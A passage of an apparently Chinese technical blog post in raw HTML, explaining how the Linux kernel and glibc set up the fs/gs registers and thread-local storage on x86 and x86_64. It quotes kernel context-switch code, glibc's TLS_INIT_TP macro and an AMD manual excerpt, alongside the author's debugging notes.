class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> *switch_to(x,y) should <span class="keyword">switch</span> tasks from x to y.</span><br><span class="line"> *</span><br><span class="line"> * This could still be optimized:</span><br><span class="line"> * - fold all the options into a flag word <span class="keyword">and</span> test it with a single test.</span><br><span class="line"> * - could test fs/gs bitsliced</span><br><span class="line"> *</span><br><span class="line"> * Kprobes <span class="keyword">not</span> supported here. Set the probe on schedule instead.</span><br><span class="line"> * Function graph tracer <span class="keyword">not</span> supported too.</span><br><span class="line"> */</span><br><span class="line">__visible __notrace_funcgraph <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *</span></span><br><span class="line"><span class="class">__<span class="title">switch_to</span>(<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev_p</span>, <span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next_p</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">prev</span> =</span> &amp;prev_p-&gt;thread;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">next</span> =</span> &amp;next_p-&gt;thread;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">prev_fpu</span> =</span> &amp;prev-&gt;fpu;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">next_fpu</span> =</span> &amp;next-&gt;fpu;</span><br><span class="line"><span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> *<span class="title">tss</span> =</span> &amp;per_cpu(cpu_tss, cpu);</span><br><span class="line"><span class="keyword">unsigned</span> fsindex, gsindex;</span><br><span class="line"><span class="keyword">fpu_switch_t</span> fpu_switch;</span><br><span class="line"></span><br><span class="line">fpu_switch = switch_fpu_prepare(prev_fpu, next_fpu, cpu);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We must save %fs and %gs before load_TLS() because</span></span><br><span class="line"><span class="comment"> * %fs and %gs may be cleared by load_TLS().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * (e.g. xen_load_tls())</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">savesegment(fs, fsindex);</span><br><span class="line">savesegment(gs, gsindex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Load TLS before restoring any segments so that segment loads</span></span><br><span class="line"><span class="comment"> * reference the correct GDT entries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">load_TLS(next, cpu);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Leave lazy mode, flushing any hypercalls made here.  This</span></span><br><span class="line"><span class="comment"> * must be done after loading TLS entries in the GDT but before</span></span><br><span class="line"><span class="comment"> * loading segments that might reference them, and and it must</span></span><br><span class="line"><span class="comment"> * be done before fpu__restore(), so the TS bit is up to</span></span><br><span class="line"><span class="comment"> * date.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">arch_end_context_switch(next_p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Switch DS and ES.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Reading them only returns the selectors, but writing them (if</span></span><br><span class="line"><span class="comment"> * nonzero) loads the full descriptor from the GDT or LDT.  The</span></span><br><span class="line"><span class="comment"> * LDT for next is loaded in switch_mm, and the GDT is loaded</span></span><br><span class="line"><span class="comment"> * above.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We therefore need to write new values to the segment</span></span><br><span class="line"><span class="comment"> * registers on every context switch unless both the new and old</span></span><br><span class="line"><span class="comment"> * values are zero.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that we don&#x27;t need to do anything for CS and SS, as</span></span><br><span class="line"><span class="comment"> * those are saved and restored as part of pt_regs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">savesegment(es, prev-&gt;es);</span><br><span class="line"><span class="keyword">if</span> (unlikely(next-&gt;es | prev-&gt;es))</span><br><span class="line">loadsegment(es, next-&gt;es);</span><br><span class="line"></span><br><span class="line">savesegment(ds, prev-&gt;ds);</span><br><span class="line"><span class="keyword">if</span> (unlikely(next-&gt;ds | prev-&gt;ds))</span><br><span class="line">loadsegment(ds, next-&gt;ds);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Switch FS and GS.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These are even more complicated than DS and ES: they have</span></span><br><span class="line"><span class="comment"> * 64-bit bases are that controlled by arch_prctl.  Those bases</span></span><br><span class="line"><span class="comment"> * only differ from the values in the GDT or LDT if the selector</span></span><br><span class="line"><span class="comment"> * is 0.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Loading the segment register resets the hidden base part of</span></span><br><span class="line"><span class="comment"> * the register to 0 or the value from the GDT / LDT.  If the</span></span><br><span class="line"><span class="comment"> * next base address zero, writing 0 to the segment register is</span></span><br><span class="line"><span class="comment"> * much faster than using wrmsr to explicitly zero the base.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The thread_struct.fs and thread_struct.gs values are 0</span></span><br><span class="line"><span class="comment"> * if the fs and gs bases respectively are not overridden</span></span><br><span class="line"><span class="comment"> * from the values implied by fsindex and gsindex.  They</span></span><br><span class="line"><span class="comment"> * are nonzero, and store the nonzero base addresses, if</span></span><br><span class="line"><span class="comment"> * the bases are overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * (fs != 0 &amp;&amp; fsindex != 0) || (gs != 0 &amp;&amp; gsindex != 0) should</span></span><br><span class="line"><span class="comment"> * be impossible.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Therefore we need to reload the segment registers if either</span></span><br><span class="line"><span class="comment"> * the old or new selector is nonzero, and we need to override</span></span><br><span class="line"><span class="comment"> * the base address if next thread expects it to be overridden.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This code is unnecessarily slow in the case where the old and</span></span><br><span class="line"><span class="comment"> * new indexes are zero and the new base is nonzero -- it will</span></span><br><span class="line"><span class="comment"> * unnecessarily write 0 to the selector before writing the new</span></span><br><span class="line"><span class="comment"> * base address.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: This all depends on arch_prctl being the only way that</span></span><br><span class="line"><span class="comment"> * user code can override the segment base.  Once wrfsbase and</span></span><br><span class="line"><span class="comment"> * wrgsbase are enabled, most of this code will need to change.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fsindex | next-&gt;fsindex | prev-&gt;fs)) &#123; <span class="comment">// 执行检查</span></span><br><span class="line">loadsegment(fs, next-&gt;fsindex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If user code wrote a nonzero value to FS, then it also</span></span><br><span class="line"><span class="comment"> * cleared the overridden base address.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">XXX:</span> if user code wrote 0 to FS and cleared the base</span></span><br><span class="line"><span class="comment"> * address itself, we won&#x27;t notice and we&#x27;ll incorrectly</span></span><br><span class="line"><span class="comment"> * restore the prior base address next time we reschdule</span></span><br><span class="line"><span class="comment"> * the process.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (fsindex)</span><br><span class="line">prev-&gt;fs = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (next-&gt;fs) <span class="comment">// 如果不为0，则直接更新fsbase的值</span></span><br><span class="line">wrmsrl(MSR_FS_BASE, next-&gt;fs);</span><br><span class="line">prev-&gt;fsindex = fsindex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(gsindex | next-&gt;gsindex | prev-&gt;gs)) &#123;</span><br><span class="line">load_gs_index(next-&gt;gsindex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This works (and fails) the same way as fsindex above. */</span></span><br><span class="line"><span class="keyword">if</span> (gsindex)</span><br><span class="line">prev-&gt;gs = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (next-&gt;gs)</span><br><span class="line">wrmsrl(MSR_KERNEL_GS_BASE, next-&gt;gs);</span><br><span class="line">prev-&gt;gsindex = gsindex;</span><br><span class="line"></span><br><span class="line">switch_fpu_finish(next_fpu, fpu_switch);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Switch the PDA and FPU contexts.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">this_cpu_write(current_task, next_p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reload esp0 and ss1.  This changes current_thread_info(). */</span></span><br><span class="line">load_sp0(tss, next);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now maybe reload the debug registers and handle I/O bitmaps</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(task_thread_info(next_p)-&gt;flags &amp; _TIF_WORK_CTXSW_NEXT ||</span><br><span class="line">     task_thread_info(prev_p)-&gt;flags &amp; _TIF_WORK_CTXSW_PREV))</span><br><span class="line">__switch_to_xtra(prev_p, next_p, tss);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (static_cpu_has_bug(X86_BUG_SYSRET_SS_ATTRS)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * AMD CPUs have a misfeature: SYSRET sets the SS selector but</span></span><br><span class="line"><span class="comment"> * does not update the cached descriptor.  As a result, if we</span></span><br><span class="line"><span class="comment"> * do SYSRET while SS is NULL, we&#x27;ll end up in user mode with</span></span><br><span class="line"><span class="comment"> * SS apparently equal to __USER_DS but actually unusable.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The straightforward workaround would be to fix it up just</span></span><br><span class="line"><span class="comment"> * before SYSRET, but that would slow down the system call</span></span><br><span class="line"><span class="comment"> * fast paths.  Instead, we ensure that SS is never NULL in</span></span><br><span class="line"><span class="comment"> * system call context.  We do this by replacing NULL SS</span></span><br><span class="line"><span class="comment"> * selectors at every context switch.  SYSCALL sets up a valid</span></span><br><span class="line"><span class="comment"> * SS, so the only way to get NULL is to re-enter the kernel</span></span><br><span class="line"><span class="comment"> * from CPL 3 through an interrupt.  Since that can&#x27;t happen</span></span><br><span class="line"><span class="comment"> * in the same task as a running syscall, we are guaranteed to</span></span><br><span class="line"><span class="comment"> * context switch between every interrupt vector entry and a</span></span><br><span class="line"><span class="comment"> * subsequent SYSRET.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We read SS first because SS reads are much faster than</span></span><br><span class="line"><span class="comment"> * writes.  Out of caution, we force SS to __KERNEL_DS even if</span></span><br><span class="line"><span class="comment"> * it previously had a different non-NULL value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span> ss_sel;</span><br><span class="line">savesegment(ss, ss_sel);</span><br><span class="line"><span class="keyword">if</span> (ss_sel != __KERNEL_DS)</span><br><span class="line">loadsegment(ss, __KERNEL_DS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> prev_p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在更新版本的内核中，<code>arch_prctl</code>将只为x86_64系统上运行的64位程序提供调用，其余的(x86_64下的32位程序,x86下的32位程序)将不能再依靠<code>arch_prctl</code>来更新<code>fs/gs</code>，这一点也可以从glibc针对32位程序的<code>TLS_INIT_TP</code>实现方式中看出，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code to initially initialize the thread pointer.  This might need</span></span><br><span class="line"><span class="comment">   special attention since &#x27;errno&#x27; is not yet available and if the</span></span><br><span class="line"><span class="comment">   operation can cause a failure &#x27;errno&#x27; must not be touched.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TLS_INIT_TP(thrdescr) \</span></span><br><span class="line">  (&#123; <span class="keyword">void</span> *_thrdescr = (thrdescr);      \</span><br><span class="line">     <span class="keyword">tcbhead_t</span> *_head = _thrdescr;      \</span><br><span class="line">     <span class="keyword">union</span> user_desc_init _segdescr;      \</span><br><span class="line">     <span class="keyword">int</span> _result;      \</span><br><span class="line">      \</span><br><span class="line">     _head-&gt;tcb = _thrdescr;      \</span><br><span class="line">     <span class="comment">/* For now the thread descriptor is at the same address.  */</span>      \</span><br><span class="line">     _head-&gt;self = _thrdescr;      \</span><br><span class="line">     <span class="comment">/* New syscall handling support.  */</span>      \</span><br><span class="line">     INIT_SYSINFO;      \</span><br><span class="line">      \</span><br><span class="line">     <span class="comment">/* Let the kernel pick a value for the &#x27;entry_number&#x27; field.  */</span>      \</span><br><span class="line">     tls_fill_user_desc (&amp;_segdescr, <span class="number">-1</span>, _thrdescr);      \</span><br><span class="line">      \</span><br><span class="line">     <span class="comment">/* Install the TLS.  */</span>      \</span><br><span class="line">     INTERNAL_SYSCALL_DECL (err);      \</span><br><span class="line">     _result = INTERNAL_SYSCALL (set_thread_area, err, <span class="number">1</span>, &amp;_segdescr.desc);   \</span><br><span class="line">      \</span><br><span class="line">     <span class="keyword">if</span> (_result == <span class="number">0</span>)      \</span><br><span class="line">       <span class="comment">/* We know the index in the GDT, now load the segment register.      \</span></span><br><span class="line"><span class="comment">  The use of the GDT is described by the value 3 in the lower      \</span></span><br><span class="line"><span class="comment">  three bits of the segment descriptor value.      \</span></span><br><span class="line"><span class="comment">      \</span></span><br><span class="line"><span class="comment">  Note that we have to do this even if the numeric value of      \</span></span><br><span class="line"><span class="comment">  the descriptor does not change.  Loading the segment register      \</span></span><br><span class="line"><span class="comment">  causes the segment information from the GDT to be loaded      \</span></span><br><span class="line"><span class="comment">  which is necessary since we have changed it.   */</span>      \</span><br><span class="line">       TLS_SET_GS (_segdescr.desc.entry_number * <span class="number">8</span> + <span class="number">3</span>);      \</span><br><span class="line">      \</span><br><span class="line">     _result == <span class="number">0</span> ? <span class="literal">NULL</span>      \</span><br><span class="line">     : <span class="string">&quot;set_thread_area failed when setting up thread-local storage\n&quot;</span>; &#125;</span><br></pre></td></tr></table></figure><p>在32位程序中，glibc通过修改gdt中的段描述符以及gs段寄存器的值来确保gsbase指向tcb基地址(64位程序使用fs寄存器，32位程序使用gs寄存器)</p><p>并且，由于段描述符是由glibc提供，所以内核在收到<code>INTERNAL_SYSCALL (set_thread_area, err, 1, &amp;_segdescr.desc)</code>所执行的请求后，除了会分配一个entry给glibc以外，也会把glibc提供的信息保存一份至该进程的<code>task_struct -&gt; thread -&gt; tls_array</code>成员中,在线程切换时，内核将会用这份保存的段描述符更新gdt表，从而实现一个entry对应N个线程</p><p>以下是部分相关代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">(无关成员太多，省略)</span><br><span class="line"><span class="keyword">int</span> pagefault_disabled;</span><br><span class="line"><span class="comment">/* CPU-specific state of this task */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> <span class="title">thread</span>;</span> <span class="comment">// 此成员记录了线程的寄存器状态及tls状态等</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * WARNING: on x86, &#x27;thread_struct&#x27; contains a variable-sized</span></span><br><span class="line"><span class="comment"> * structure.  It *MUST* be at the end of &#x27;task_struct&#x27;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Do not put anything below here!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> &#125;</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* Cached TLS descriptors: */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span><span class="title">tls_array</span>[<span class="title">GDT_ENTRY_TLS_ENTRIES</span>];</span> <span class="comment">// 段描述符信息被保存在此成员中</span></span><br><span class="line">  (无关成员太多，省略)</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *switch_to(x,y) should switch tasks from x to y.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This could still be optimized:</span></span><br><span class="line"><span class="comment"> * - fold all the options into a flag word and test it with a single test.</span></span><br><span class="line"><span class="comment"> * - could test fs/gs bitsliced</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Kprobes not supported here. Set the probe on schedule instead.</span></span><br><span class="line"><span class="comment"> * Function graph tracer not supported too.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__visible __notrace_funcgraph <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *</span></span><br><span class="line"><span class="class">__<span class="title">switch_to</span>(<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev_p</span>, <span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next_p</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">prev</span> =</span> &amp;prev_p-&gt;thread;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">next</span> =</span> &amp;next_p-&gt;thread;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">prev_fpu</span> =</span> &amp;prev-&gt;fpu;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">next_fpu</span> =</span> &amp;next-&gt;fpu;</span><br><span class="line"><span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> *<span class="title">tss</span> =</span> &amp;per_cpu(cpu_tss, cpu);</span><br><span class="line"><span class="keyword">unsigned</span> fsindex, gsindex;</span><br><span class="line"><span class="keyword">fpu_switch_t</span> fpu_switch;</span><br><span class="line"></span><br><span class="line">fpu_switch = switch_fpu_prepare(prev_fpu, next_fpu, cpu);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We must save %fs and %gs before load_TLS() because</span></span><br><span class="line"><span class="comment"> * %fs and %gs may be cleared by load_TLS().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * (e.g. xen_load_tls())</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">savesegment(fs, fsindex);</span><br><span class="line">savesegment(gs, gsindex);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Load TLS before restoring any segments so that segment loads</span></span><br><span class="line"><span class="comment"> * reference the correct GDT entries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">load_TLS(next, cpu);  <span class="comment">// 在线程上下文切换时，更新gdt</span></span><br><span class="line">  (省略)</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> load_TLS(t, cpu)native_load_tls(t, cpu)</span></span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">native_load_tls</span><span class="params">(struct thread_struct *t, <span class="keyword">unsigned</span> <span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *<span class="title">gdt</span> =</span> get_cpu_gdt_table(cpu);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="comment">// 更新gdt，使对应的段描述符变为将要执行的线程的段描述符</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; GDT_ENTRY_TLS_ENTRIES; i++)</span><br><span class="line">gdt[GDT_ENTRY_TLS_MIN + i] = t-&gt;tls_array[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在调试的过程中也遇到了一个奇怪的问题，在qemu+64位kernel+busybox+64位可执行程序的情况下，虽然执行的是64位程序，但是<code>arch_prctl</code>中设置的地址居然是32位地址，然而在正常的ubuntu发行版上却没有这个问题，之后可以再看看原因</p><p>顺便总结一下我调试的时候遇到的不同情况，这些不同情况的原理都在上面的代码和注释中写明了</p><ol><li><p>qemu+64位老版kernel+busybox+64位可执行程序(glib 2.27+gcc 7.5.0编译)</p><p>此时<code>arch_prctl</code>设置fs的地址为32位地址，fs因此被设置为0x63，gs为0x0，并没有直接通过<code>WRMSR</code>修改fs寄存器的基地址，而是使用段寻址方式</p></li><li><p>qemu+64位老版kernel+busybox+32位可执行程序(glib 2.27+gcc 7.5.0编译)</p><p>此时不调用<code>arch_prctl</code>，使用glibc针对32系统<code>TLS_INIT_TP</code>修改了gs为0x63，fs保持不变为0x0，并没有直接通过<code>WRMSR</code>修改gs寄存器的基地址，而是使用段寻址方式</p></li><li><p>发行版64位ubuntu(新版内核)+32位可执行程序(glib 2.27+gcc 7.5.0编译)</p><p>此时不调用<code>arch_prctl</code>，使用glibc针对32系统<code>TLS_INIT_TP</code>修改了gs为0x63，fs保持不变为0x0，与第二种情况是一致的</p></li><li><p>发行版64位ubuntu(新版内核)+64位可执行程序(glib 2.27+gcc 7.5.0编译)</p><p>此时<code>arch_prctl</code>设置fs的地址为64位地址，fs因此被设置为0x0，gs也为0x0，<code>arch_prctl</code>中直接通过<code>WRMSR</code>修改了fs寄存器的基地址，不使用段寻址方式</p></li></ol><p>关于cpu是如何更改fs寄存器的，以下是摘录自<code>[AMD Architecture Programmer&#39;s Manual Volume 2: System Programming](https://www.amd.com/system/files/TechDocs/24593.pdf#page=124), section 4.5.3</code>，在内核的实现中，我们可以看到第一种方法被应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FS and GS Registers in 64-Bit Mode. Unlike the CS,DS,ES, and SS segments, the FS and GS segment overrides can   </span><br><span class="line">be used in 64-bit mode. When FS and GS segment overrides are used in 64-bit mode, their respective base addresses are used in the effective-address (EA) calculation. The complete EA calculation then becomes (FS or GS).base + base + (scale * index) + displacement. The FS.base and GS.base values are also expanded to the full 64-bit virtual-address size, as shown in Figure 4-5. The resulting EA calculation is allowed to wrap across positive and negative addresses.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">There are two methods to update the contents of the FS.base and GS.base hidden descriptor fields. The first is available exclusively to privileged software (CPL &#x3D; 0). The FS.base and GS.base hidden descriptor-register fields are mapped to MSRs. Privileged software can load a 64-bit base address in canonical form into FS.base or GS.base using a single WRMSR instruction. The FS.base MSR address is C000_0100h while the GS.base MSR address is C000_0101h.</span><br><span class="line"></span><br><span class="line">The second method of updating the FS and GS base fields is available to software running at any privilege level (when supported by the implementation and enabled by setting CR4[FSGSBASE]). The WRFSBASE and WRGSBASE instructions copy the contents of a GPR to the FS.base and GS.base fields respectively. When the operand size is 32 bits, the upper doubleword of the base is cleared. WRFSBASE and WRGSBASE are only supported in 64-bit mode.</span><br></pre></td></tr></table></figure><p>所以这里借助<code>x/32gx pthread_self()</code>来访问</p><p>下面是<code>pthread_self()</code>及其相关关键结构的实现(在linux x86_64系统上),可以看到实际上这个函数是取了<code>fs:(结构体pthread中header.self成员的偏移)</code>，而我们由上面的知识可以知道，fs在这里代表TCB的起始地址，那么加上结构体pthread中header.self成员的偏移，就相当于取tcbhead_t中self成员的值，这个值指向TCB的起始地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 